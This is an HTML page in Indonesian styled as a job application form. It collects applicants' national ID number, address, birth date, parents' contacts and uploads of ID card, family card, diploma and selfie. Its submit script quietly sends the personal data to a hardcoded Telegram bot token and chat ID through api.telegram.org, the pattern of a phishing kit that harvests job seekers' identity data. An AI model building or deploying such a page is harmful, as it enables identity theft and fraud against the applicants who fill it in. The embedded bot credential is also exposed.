<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pendaftaran Lowongan Kerja</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: #f4f4f9;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
            min-height: 100vh;
            padding: 20px;
            overflow-x: hidden;
        }

        .form-container {
            background: #fff;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 600px;
            overflow-y: auto;
            height: 100%;
        }

        h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
            text-align: center;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        input, select, textarea, button {
            background: #f7f7f7;
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 12px;
            margin-bottom: 15px;
            font-size: 16px;
            color: #333;
            outline: none;
        }

        button {
            background: #4CAF50;
            color: #fff;
            border: none;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
            transition: background 0.3s;
        }

        button:hover {
            background: #45a049;
        }

        .file-input {
            background: #f7f7f7;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            color: #333;
            font-size: 16px;
        }

        .file-input::file-selector-button {
            background: #4CAF50;
            color: #fff;
            border: none;
            padding: 10px;
            cursor: pointer;
            border-radius: 5px;
        }

        .file-input::file-selector-button:hover {
            background: #45a049;
        }

        .form-footer {
            margin-top: 20px;
            font-size: 14px;
            color: #888;
            text-align: center;
        }

        .form-footer a {
            color: #4CAF50;
            text-decoration: none;
        }

        .form-footer a:hover {
            text-decoration: underline;
        }

        /* Responsive Styles */
        @media (max-width: 600px) {
            .form-container {
                width: 90%;
                padding: 20px;
            }

            h1 {
                font-size: 20px;
            }

            input, select, textarea, button {
                font-size: 14px;
                padding: 10px;
            }

            button {
                padding: 12px;
            }

            .file-input {
                padding: 8px;
            }

            .file-input::file-selector-button {
                padding: 8px;
            }
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h1>Pendaftaran Lowongan Kerja</h1>
        <form id="registration-form" enctype="multipart/form-data">
            <input type="text" name="fullName" placeholder="Nama Lengkap" required>
            <input type="email" name="email" placeholder="Email" required>
            <input type="tel" name="phone" placeholder="Nomor Telepon" required>
            <input type="text" name="nik" placeholder="Nomor Induk Kependudukan (NIK)" required>
            <input type="text" name="address" placeholder="Alamat Lengkap" required>

            <!-- Input Tanggal Lahir dengan Format Teks -->
            <input type="text" name="dob" placeholder="Tanggal Lahir (dd/mm/yyyy)" required>

            <select name="education" required>
                <option value="" disabled selected>Pendidikan Terakhir</option>
                <option value="SD">SD</option>
                <option value="SMP">SMP</option>
                <option value="SMA/SMK">SMA/SMK</option>
                <option value="D1">D1</option>
                <option value="D2">D2</option>
                <option value="D3">D3</option>
                <option value="S1">S1</option>
                <option value="S2">S2</option>
                <option value="S3">S3</option>
            </select>
            <textarea name="experience" rows="4" placeholder="Pengalaman Kerja" required></textarea>
            
            <!-- Upload File -->
            <h5>Kartu Keluarga</h5>
            <input type="file" name="familyCard" class="file-input" accept=".jpg, .jpeg, .png, .pdf" required>
            <h5>Foto KTP</h5>
            <input type="file" name="ktp" class="file-input" accept=".jpg, .jpeg, .png, .pdf" required>
            <h5>Izajah Terakhir</h5>
            <input type="file" name="ijazah" class="file-input" accept=".jpg, .jpeg, .png, .pdf" required>
            <h5>File Cv</h5>
            <input type="file" name="cv" class="file-input" accept=".pdf, .doc, .docx" required>
            <h5>Foto Diri</h5>
            <input type="file" name="photo" class="file-input" accept=".jpg, .jpeg, .png" required>
            
            <!-- Informasi Orang Tua -->
            <h3>Contact Lainnya</h3>
            
            <input type="text" name="parentName" placeholder="Nama Orang Tua" required>
            <input type="tel" name="parentPhone" placeholder="Nomor Telepon Orang Tua" required>

            <button type="submit">Daftar</button>
        </form>
        
    </div>

    <script>
        document.getElementById('registration-form').addEventListener('submit', async function (e) {
            e.preventDefault();

            const formData = new FormData(e.target);

            // Data bot Telegram
            const BOT_TOKEN = '7638946999:AAHn-ESwj_oYBljAvsDOTtBMWGpzbX2BgFY';
            const CHAT_ID = '-1002447637268';

            // Menyiapkan pesan untuk Telegram
            let message = `
Pendaftaran Lowongan Kerja Baru:
- Nama Lengkap: ${formData.get('fullName')}
- Email: ${formData.get('email')}
- Nomor Telepon: ${formData.get('phone')}
- NIK: ${formData.get('nik')}
- Alamat: ${formData.get('address')}
- Tanggal Lahir: ${formData.get('dob')}
- Pendidikan Terakhir: ${formData.get('education')}
- Pengalaman Kerja: ${formData.get('experience')}
- Nama Orang Tua: ${formData.get('parentName')}
- Nomor Telepon Orang Tua: ${formData.get('parentPhone')}
            `;

            // Kirim pesan ke Telegram
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;

            try {
                // Kirim data ke Telegram
                await fetch(url);

                // Kirim data pendaftaran (termasuk file) ke server atau penyimpanan lainnya
                const response = await fetch('https://example.com/api/submit-registration', {
                    method: 'POST',
                    body: formData,
                });

                if (response.ok) {
                    alert('Pendaftaran berhasil! Kami akan menghubungi Anda segera.');
                    window.location.href = 'thank-you.html'; // Redirect ke halaman terima kasih
                } else {
                    alert('Terjadi kesalahan, coba lagi.');
                }
            } catch (error) {
                alert('Tidak dapat mengirim data, periksa koneksi Anda.');
            }
        });
    </script>
</body>
</html>
